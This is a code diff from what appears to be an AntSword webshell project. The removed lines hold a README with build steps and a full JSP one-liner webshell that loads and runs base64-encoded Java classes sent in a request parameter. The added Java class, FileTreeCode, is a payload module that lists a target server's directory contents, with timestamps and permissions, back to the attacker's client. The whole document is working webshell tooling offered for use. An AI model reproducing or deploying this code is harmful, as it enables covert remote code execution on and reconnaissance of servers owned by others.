@@ -1,39 +1,11 @@
-# JspForAntSword
-中国蚁剑JSP一句话Payload
-
-详细介绍： https://yzddmr6.tk/posts/antsword-diy-3/
-
-环境： jdk1.6  tomcat7
-
-编译命令
-
-```
-javac -cp "D:/xxxx/lib/servlet-api.jar;D:/xxx/lib/jsp-api.jar" Test.java
-```
-
-保存编译后的class字节码
-
-```
-base64 -w 0 Test.class > Test.txt
-```
-
-Shell：
-
-```
-<%!class U extends ClassLoader{ U(ClassLoader c){ super(c); }public Class g(byte []b){ return super.defineClass(b,0,b.length); }}%><% String cls=request.getParameter("ant");if(cls!=null){ new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(cls)).newInstance().equals(pageContext); }%>
-```
-
-
-
-Demo.java
-
-```
 import javax.servlet.ServletRequest;
 import javax.servlet.ServletResponse;
 import javax.servlet.jsp.PageContext;
 import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.text.SimpleDateFormat;
 
-public class Demo {
+public class FileTreeCode {
     public String encoder;
     public String cs;
     @Override
@@ -49,12 +21,9 @@ public class Demo {
             response.setContentType("text/html");
             request.setCharacterEncoding(cs);
             response.setCharacterEncoding(cs);
-            String var0 = EC(decode(request.getParameter("var0")+""));
             String var1 = EC(decode(request.getParameter("var1")+""));
-            String var2 = EC(decode(request.getParameter("var2")+""));
-            String var3 = EC(decode(request.getParameter("var3")+""));
             output.append("->" + "|");
-            //sb.append(SysInfoCode(var0));
+            sb.append(FileTreeCode(var1));
             output.append(sb.toString());
             output.append("|" + "<-");
             page.getOut().print(output.toString());
@@ -89,8 +58,25 @@ public class Demo {
         }
         return str;
     }
-
+    String FileTreeCode(String dirPath) throws Exception {
+        File oF = new File(dirPath), l[] = oF.listFiles();
+        String s = "", sT, sQ, sF = "";
+        java.util.Date dt;
+        String fileCode=(String)System.getProperties().get("file.encoding");
+        SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
+        for (int i = 0; i < l.length; i++) {
+            dt = new java.util.Date(l[i].lastModified());
+            sT = fm.format(dt);
+            sQ = l[i].canRead() ? "R" : "";
+            sQ += l[i].canWrite() ? " W" : "";
+            String nm = new String(l[i].getName().getBytes(fileCode), cs);
+            if (l[i].isDirectory()) {
+                s += nm + "/\t" + sT + "\t" + l[i].length() + "\t" + sQ + "\n";
+            } else {
+                sF += nm + "\t" + sT + "\t" + l[i].length() + "\t" + sQ + "\n";
+            }
+        }
+        s += sF;
+        return new String(s.getBytes(fileCode), cs);
+    }
 }
-
-```
-
